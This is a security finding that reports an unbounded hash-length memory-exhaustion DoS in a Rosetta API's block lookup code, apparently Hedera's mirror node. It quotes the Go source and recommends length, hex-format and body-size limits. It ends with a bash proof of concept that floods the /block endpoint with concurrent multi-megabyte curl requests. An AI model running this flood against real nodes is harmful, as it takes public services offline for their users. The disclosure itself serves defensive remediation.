### Title
Unbounded Hash Length in `findBlockByHash()` Enables Memory-Exhaustion DoS via Unauthenticated POST Requests

### Summary
The `findBlockByHash()` function in `rosetta/app/persistence/block.go` accepts a `hash` string of arbitrary length with no upper-bound validation. An unauthenticated attacker can POST a JSON body containing a multi-megabyte hex string as the `block_identifier.hash` field to the `/block` or `/block/transaction` endpoints, forcing the server to allocate and hold that string in memory before issuing a parameterized database query. Repeated concurrent requests can exhaust server memory and render the node unavailable.

### Finding Description

**Entry points** — `FindByHash` (line 135) and `FindByIdentifier` (line 147) in `rosetta/app/persistence/block.go` are the public callers of `findBlockByHash`. Both perform only an empty-string guard:

```go
// FindByHash – line 136
if hash == "" {
    return nil, hErrors.ErrInvalidArgument
}

// FindByIdentifier – line 151
if index < 0 || hash == "" {
    return nil, hErrors.ErrInvalidArgument
}
```

No length limit, no hex-format check, no regex validation.

**Service layer** — `base_service.go` lines 80 and 85 call `tools.SafeRemoveHexPrefix()` before forwarding to the repository. `SafeRemoveHexPrefix` only strips a `"0x"` prefix; it performs no length or format validation.

**Persistence layer** — `findBlockByHash` (lines 226–241) passes the raw string directly to GORM as a named parameter:

```go
db.Raw(selectByHashWithIndex, sql.Named("hash", hash)).First(rb)
```

The SQL template is:

```sql
where hash = @hash collate "C"
```

The `collate "C"` clause forces a binary byte-by-byte comparison. For a multi-megabyte input, PostgreSQL must receive the full parameter value over the wire, allocate it server-side, and evaluate the predicate against every row in `record_file` (or use an index scan that still materialises the key). The Go application itself must also allocate the full string in heap memory for the duration of the request.

**No HTTP body size limit found** — a search across all rosetta Go files for `MaxBytesReader`, `LimitReader`, `maxBodySize`, and `ReadLimit` returned no matches. Go's `net/http` imposes no default body size limit, so the SDK server will read the entire request body.

### Impact Explanation

An attacker who sends, say, 50 concurrent POST requests each carrying a 20 MB hex string as `block_identifier.hash` forces the Go process to hold ~1 GB of live heap simultaneously. Because Go's GC is generational and the strings are live until the DB call returns, memory pressure can trigger OOM-kill or severe GC pauses, making the Rosetta API unresponsive. For a mirror node serving ≥25 % of network market cap, this constitutes a high-severity non-network DoS: no consensus participation is required, no authentication is needed, and the attack is trivially repeatable.

### Likelihood Explanation

The `/block` and `/block/transaction` endpoints are unauthenticated public JSON-RPC endpoints required by the Rosetta specification. Any external party can POST to them. The exploit requires only an HTTP client and knowledge of the endpoint path (publicly documented). It is repeatable at will and requires no special privileges, keys, or on-chain state.

### Recommendation

1. **Enforce a maximum hash length** in `FindByHash` and `FindByIdentifier` before calling `findBlockByHash`. Valid Hedera/Rosetta block hashes are at most 96 hex characters (SHA-384); reject anything longer:
   ```go
   const maxHashLength = 96
   if len(hash) > maxHashLength {
       return nil, hErrors.ErrInvalidArgument
   }
   ```
2. **Validate hex format** with a compiled regex (e.g., `^[0-9a-fA-F]{64}$` or `^[0-9a-fA-F]{96}$`) so non-hex garbage is rejected before hitting the database.
3. **Set an HTTP request body size limit** on the Rosetta HTTP server (e.g., `http.MaxBytesReader`) to cap total request size regardless of field.

### Proof of Concept

```bash
# Generate a 10 MB hex string (valid hex characters, maximum-length attack)
BIGHASH=$(python3 -c "print('a' * 10_000_000)")

# Send to the /block endpoint (unauthenticated)
curl -s -X POST http://<rosetta-host>:5135/block \
  -H 'Content-Type: application/json' \
  -d "{
    \"network_identifier\": {\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},
    \"block_identifier\": {\"hash\": \"$BIGHASH\"}
  }"

# Repeat 50 times concurrently to exhaust heap
for i in $(seq 1 50); do
  curl -s -X POST http://<rosetta-host>:5135/block \
    -H 'Content-Type: application/json' \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},\"block_identifier\":{\"hash\":\"$BIGHASH\"}}" &
done
wait
```

Each request forces the Go server to allocate the full string, pass it to PostgreSQL, and hold it in memory until the DB round-trip completes. Concurrent flooding exhausts available heap and causes OOM or severe latency degradation. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** rosetta/app/persistence/block.go (L34-45)
```go
	selectByHashWithIndex string = `select
                                      consensus_start,
                                      coalesce((
                                        select c.consensus_start - 1
                                        from record_file c
                                        where c.index = p.index + 1
                                      ), consensus_end) as consensus_end,
                                      hash,
                                      index,
                                      prev_hash
                                    from record_file p
                                    where hash = @hash collate "C"`
```

**File:** rosetta/app/persistence/block.go (L135-145)
```go
func (br *blockRepository) FindByHash(ctx context.Context, hash string) (*types.Block, *rTypes.Error) {
	if hash == "" {
		return nil, hErrors.ErrInvalidArgument
	}

	if err := br.initGenesisRecordFile(ctx); err != nil {
		return nil, err
	}

	return br.findBlockByHash(ctx, hash)
}
```

**File:** rosetta/app/persistence/block.go (L147-153)
```go
func (br *blockRepository) FindByIdentifier(ctx context.Context, index int64, hash string) (
	*types.Block,
	*rTypes.Error,
) {
	if index < 0 || hash == "" {
		return nil, hErrors.ErrInvalidArgument
	}
```

**File:** rosetta/app/persistence/block.go (L226-241)
```go
func (br *blockRepository) findBlockByHash(ctx context.Context, hash string) (*types.Block, *rTypes.Error) {
	db, cancel := br.dbClient.GetDbWithContext(ctx)
	defer cancel()

	rb := &recordBlock{}
	if err := db.Raw(selectByHashWithIndex, sql.Named("hash", hash)).First(rb).Error; err != nil {
		return nil, handleDatabaseError(err, hErrors.ErrBlockNotFound)
	}

	if rb.Index < br.genesisBlock.Index {
		log.Errorf("The block with hash %s is before the genesis block", hash)
		return nil, hErrors.ErrBlockNotFound
	}

	return rb.ToBlock(br.genesisBlock), nil
}
```

**File:** rosetta/app/services/base_service.go (L79-86)
```go
	if bIdentifier.Hash != nil && bIdentifier.Index != nil {
		h := tools.SafeRemoveHexPrefix(*bIdentifier.Hash)
		return b.blockRepo.FindByIdentifier(ctx, *bIdentifier.Index, h)
	} else if bIdentifier.Hash == nil && bIdentifier.Index != nil {
		return b.blockRepo.FindByIndex(ctx, *bIdentifier.Index)
	} else if bIdentifier.Index == nil && bIdentifier.Hash != nil {
		h := tools.SafeRemoveHexPrefix(*bIdentifier.Hash)
		return b.blockRepo.FindByHash(ctx, h)
```

**File:** rosetta/app/tools/hex.go (L17-21)
```go
// SafeRemoveHexPrefix - removes 0x prefix from a string if it has one
func SafeRemoveHexPrefix(string string) string {
	if strings.HasPrefix(string, HexPrefix) {
		return string[2:]
	}
```
